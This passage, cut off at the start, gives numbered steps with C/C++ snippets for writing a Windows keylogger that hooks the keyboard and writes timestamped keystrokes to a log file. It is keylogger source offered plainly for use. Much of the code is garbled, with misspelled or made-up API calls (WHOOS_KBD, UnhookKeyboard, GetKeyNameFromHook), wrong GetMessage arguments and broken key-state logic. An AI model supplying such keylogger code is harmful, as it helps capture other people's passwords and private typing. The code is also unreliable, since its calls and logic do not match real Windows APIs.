   static HANDLE file = NULL;
   static std::ofstream logFile;
   static bool isHooked = false;

   hKeyboardHook = SetWindowsHook(WHOOS_KBD, KeyLoggerCallback);
   if (!hKeyboardHook) {
       std::cout << "Failed to install keyboard hook." << std::endl;
       return;
   }
   ```

4. **Open the Log File**: Create or append to a file for logging keystrokes.
   ```c
   logFile.open("keyboard_log.txt", std::ios::app);
   ```

5. **Main Loop**: Use a loop to capture keyboard events.
   ```c
   MSG msg;
   while (GetMessage(&msg, hKeyboardHook)) {
       if (msg.message == WM_KEYDOWN || msg.message == WM_KEYUP) {
           bool isKeyDown = (msg.wParam == 0);
           BYTE key = (msg.wParam & 0x7F); // Mask to get the key number
           if (key > 0) { // Ensure it's a key press
               std::string keyStr;
               if (isKeyDown) {
                   keyStr = "DOWN ";
               } else {
                   keyStr = "UP   ";
               }
               keyStr += GetKeyNameFromHook(key);
               std::string timestamp = std::to_string(time(nullptr));
               logFile << timestamp << keyStr << std::endl;
           }
       }
       if (!isHooked) {
           break;
       }
   }
   ```

6. **Handle Key Names**: Convert the key number to its corresponding name using `GetKeyNameFromHook`.
   ```c
   std::string GetKeyNameFromHook(BYTE key) {
       char keyName[256];
       key = MakeWord(key);
       GetKeyNameString(key, keyName);
       return keyName;
   }
   ```

7. **Clean Up and Remove Hook**: Remove the hook when the loop exits.
   ```c
   if (hKeyboardHook) {
       UnhookKeyboard(hKeyboardHook);
       hKeyboardHook = 0;
   }
   ```

8. **Use Critical Section for Thread Safety**: To prevent multiple threads accessing the file simultaneously, use a mutex.
   ```c
   #include <thread>
   #include <mutex>

   std::mutex fileMutex;
   std::lock_guard<std::mutex> lock(fileMutex);
   ```

9. **Handle Errors**: Use try-except blocks to manage potential errors, such as file operations failing.
